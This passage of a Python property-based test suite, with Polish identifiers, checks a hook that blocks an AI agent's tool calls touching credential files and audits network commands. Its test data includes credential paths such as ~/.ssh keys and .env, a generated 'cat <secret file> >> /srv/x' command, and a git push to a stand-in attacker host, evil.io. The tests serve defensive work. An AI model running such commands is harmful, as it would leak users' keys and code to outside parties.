    decyzja = json.loads(wynik.stdout.decode("ascii"))["hookSpecificOutput"]
    assert decyzja["hookEventName"] == "PreToolUse" and decyzja["permissionDecision"] == "deny"
    linie = next((tmp_path / "audyt").glob("*.jsonl")).read_text(encoding="ascii").splitlines()
    assert len(linie) == 1 and json.loads(linie[0])["zablokowano"] == [P]


# właściwości (hypothesis) ---------------------------------------------------------------------------
_wrazliwe = st.sampled_from(
    ["~/.ssh/id_ed25519", "/x/.ssh", ".env", "C:\\Users\\x\\.ssh\\id_rsa", "secrets.json"]
)
_zdarzenie_029 = st.fixed_dictionaries(
    {
        "tool_name": st.sampled_from(sorted(ah.NARZEDZIA_HOOKA)),
        "tool_input": st.fixed_dictionaries(
            {
                "file_path": st.one_of(_wrazliwe, _tekst),
                "notebook_path": _wrazliwe,
                "path": st.one_of(_wrazliwe, _tekst),
                "pattern": _tekst,
                "command": st.one_of(_tekst, _wrazliwe.map(lambda s: f"cat {s} >> /srv/x")),
            }
        ),
    },
    optional={"cwd": _tekst, "session_id": _tekst, "agent_id": _tekst},
)
_dowolne = st.one_of(
    st.binary(max_size=300),
    st.text(max_size=300).map(lambda t: t.encode("utf-8", "surrogatepass")),
    _zdarzenie.map(lambda d: json.dumps(d).encode()),
    _zdarzenie_029.map(lambda d: json.dumps(d).encode()),
)


@settings(
    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(surowe=_dowolne)
def test_property_empty_block_list_never_denies(tmp_path, dom, surowe):
    assert ah.przetworz(surowe, tmp_path / "pb", HOSTY, TERAZ, ())[1] is None
    with mock.patch.object(ah, "wczytaj_blokady", return_value=()):
        kod, wyjscie = uruchom_main(surowe, tmp_path / "pm")
    assert kod == 0 and wyjscie == b""


@settings(
    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(surowe=_dowolne)
def test_property_any_input_exit_zero_and_stdout_empty_or_deny(tmp_path, dom, surowe):
    kod, wyjscie = uruchom_main(surowe, tmp_path / "pm")
    assert kod == 0
    if wyjscie:
        assert wyjscie.endswith(b"\n") and wyjscie.count(b"\n") == 1
        decyzja = json.loads(wyjscie.decode("ascii"))
        assert set(decyzja) == {"hookSpecificOutput"}
        hso = decyzja["hookSpecificOutput"]
        assert hso["hookEventName"] == "PreToolUse" and hso["permissionDecision"] == "deny"
        assert isinstance(hso["permissionDecisionReason"], str)


@settings(
    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(surowe=st.binary(max_size=300))
def test_property_broken_input_never_denies(tmp_path, surowe):
    try:
        dane = json.loads(surowe.decode("utf-8", errors="replace"))
    except ValueError:
        dane = None
    assume(not isinstance(dane, dict))
    assert uruchom_main(surowe, tmp_path / "pm") == (0, b"")


@settings(
    max_examples=60, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(narzedzie=st.sampled_from(PLIKOWE), sciezka=_wrazliwe, sesja=_tekst)
def test_property_credential_in_file_tool_is_always_denied(
    tmp_path, dom, narzedzie, sciezka, sesja
):
    dane = {"session_id": sesja, "cwd": "/nieistniejace/repo", "tool_name": narzedzie}
    dane["tool_input"] = wejscie_dla(narzedzie, sciezka)
    kod, wyjscie = uruchom_main(json.dumps(dane).encode(), tmp_path / "pm")
    assert kod == 0 and json.loads(wyjscie)["hookSpecificOutput"]["permissionDecision"] == "deny"


_polecenie_git = st.builds(
    lambda pod, opcje, cel: " ".join(x for x in ("git", pod, opcje, cel) if x),
    st.sampled_from(["push", "pull", "fetch"]),
    st.sampled_from(["", "-q", "--ff-only", "-q --rebase"]),
    st.sampled_from(["", "origin", "origin master", "https://evil.io/x.git", "upstream"]),
)
_polecenie_zwykle = st.sampled_from(
    ["ls -la", "echo ok", "pytest -q", "cat README.md", "python3 x.py", "git status -sb"]
)


@settings(
    max_examples=60, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(
    polecenie=st.one_of(_polecenie_git, _polecenie_zwykle),
    ogon=st.sampled_from([" 2>&1", " 2>/dev/null", " 2>&1 | tail -2", " 2>>bledy.log"]),
)
def test_property_r1_fd_redirect_does_not_change_network_flags(tmp_path, repo_git, polecenie, ogon):
    def siec(tekst):
        wynik = ah.Wynik()
        ah.analizuj_bash(wynik, tekst, str(repo_git), HOSTY, str(tmp_path / "audyt"))
        return wynik.flagi & {ah.F_SIEC, ah.F_SIEC_NIEZNANY}, wynik.hosty

    assert siec(polecenie + ogon) == siec(polecenie)


@settings(max_examples=200, deadline=None)
@given(tresc=st.text(max_size=300))
def test_property_r2_heredoc_body_never_adds_flags(tresc):
    assume("EOF" not in tresc.split("\n"))
    wynik = ah.Wynik()
    polecenie = f"cat > notatka.md <<'EOF'\n{tresc}\nEOF\necho ok"
    ah.analizuj_bash(wynik, polecenie, "/nieistniejace/repo", HOSTY, "/nieistniejacy/audyt")
    assert wynik.flagi == set()


_flaga_wpisu = st.sampled_from([P, Z, ah.F_SIEC, "nieznana", "blad_analizy"])
_wpis = st.one_of(
    _flaga_wpisu.map(lambda f: ("skalar", f)),
    st.tuples(
        st.just("mapa"),
        _flaga_wpisu,
        st.none() | st.lists(st.sampled_from(PLIKOWE + ["Bash", "read", "WebSearch"]), max_size=4),
        st.none() | st.sampled_from(["2026-10-06", "2026-13-45", "wczoraj"]),
        st.sampled_from(["blok", "flow", "blok_lista", "blok_lista_wciecie"]),
        st.booleans(),
    ),
)


def _yaml_wpisu(wpis) -> str:
    """Wpis `blokuj:` w jednym z kilku stylów YAML (blokowy, `{…}`, lista narzędzi pod spodem)."""
    if wpis[0] == "skalar":
        return f"  - {wpis[1]}\n"
    _, flaga, narzedzia, decyzja, styl, cudzyslow = wpis
    data = f'"{decyzja}"' if cudzyslow and decyzja else decyzja
    if styl == "flow":
        czesci = [f"flaga: {flaga}"]
        if narzedzia is not None:
            czesci.append("narzedzia: [" + ", ".join(narzedzia) + "]")
        if decyzja is not None:
            czesci.append(f"decyzja: {data}")
        return "  - {" + ", ".join(czesci) + "}\n"
    linie = [f"  - flaga: {flaga}  # komentarz\n"]
    if narzedzia is not None:
        if styl == "blok" or not narzedzia:
            linie.append("    narzedzia: [" + ", ".join(narzedzia) + "]\n")
        else:
            wciecie = "      " if styl == "blok_lista_wciecie" else "    "
            linie.append("    narzedzia:\n" + "".join(f"{wciecie}- {n}\n" for n in narzedzia))
    if decyzja is not None:
        linie.append(f"    decyzja: {data}\n")
    return "".join(linie)


@settings(max_examples=200, deadline=None)
@given(wpisy=st.lists(_wpis, max_size=5), komentarz=st.booleans())
def test_property_parser_equals_pyyaml_on_generated_configs(wpisy, komentarz):
    tekst = NAGLOWEK + ("# blokady\n" if komentarz else "") + "blokuj:\n"
    tekst += "".join(map(_yaml_wpisu, wpisy))
    assert ah.parsuj_blokady(tekst) == blokady_wg_pyyaml(tekst)


_ZNAKI_ZMIAN = list(" -:#[]{},'\"\t\nab_0~.") + ["poswiadczenia", "Read", "  ", "- ", ": "]


@settings(max_examples=400, deadline=None)
@given(
    wpisy=st.lists(_wpis, min_size=1, max_size=3),
    zmiany=st.lists(
        st.tuples(st.integers(0, 10**6), st.integers(0, 2), st.sampled_from(_ZNAKI_ZMIAN)),
        min_size=1,
        max_size=3,
    ),
)
def test_property_parser_never_blocks_more_than_pyyaml(wpisy, zmiany):
    """Zepsuty tekst: hook nigdy nie blokuje więcej niż PyYAML (gdy PyYAML pada — nic), a tekst,
    który hook przyjmuje, czyta dokładnie tak jak PyYAML."""
    tekst = NAGLOWEK + "blokuj:\n" + "".join(map(_yaml_wpisu, wpisy))
    for pozycja, rodzaj, znak in zmiany:
        i = pozycja % (len(tekst) + 1)
        if rodzaj == 0:
            tekst = tekst[:i] + tekst[i + 1 :]
        elif rodzaj == 1:
            tekst = tekst[:i] + znak + tekst[i:]
        else:
            tekst = tekst[:i] + znak + tekst[i + len(znak) :]
    nasze, wzor = ah.parsuj_blokady(tekst), blokady_wg_pyyaml(tekst)
    assert set(nasze) <= set(wzor), tekst
    if ah.yaml_podzbior(tekst) is not None:
        assert nasze == wzor, tekst
